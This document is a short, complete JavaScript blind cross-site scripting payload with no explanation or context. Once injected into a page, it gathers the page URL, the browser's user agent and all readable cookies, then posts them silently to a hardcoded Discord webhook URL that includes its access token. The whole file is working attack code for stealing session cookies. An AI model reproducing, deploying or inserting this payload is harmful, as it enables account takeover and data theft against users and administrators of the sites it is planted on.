(function () {
  const cap = (s, n) => (s || '').toString().slice(0, n);
  const escbt = s => (s || '').toString().replace(/`/g, '\\`');

  const data = {
    url: location.href,
    ua: cap(navigator.userAgent, 1000),
    ck: cap(document.cookie || 'NA', 1000),
    ts: new Date().toISOString()
  };

  const embed = {
    title: 'Blind XSS',
    description: `URL: ${escbt(data.url)}\nTime: ${data.ts}`,
    fields: [
      { name: 'UA', value: escbt(data.ua) },
      { name: 'Cookies', value: escbt(data.ck) }
    ]
  };

  const form = new FormData();
  form.append('payload_json', JSON.stringify({
    content: 'Blind XSS fired',
    embeds: [embed]
  }));

  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1411319017452339301/0kk_SFr88XR9mm8v22bjgcDwdCmPeWXqAE4zSnmtrEI8DKf6DFSMJ6srVpn9_aErB37o';
  try { fetch(DISCORD_WEBHOOK, { method: 'POST', body: form }); } catch (e) {}
})();
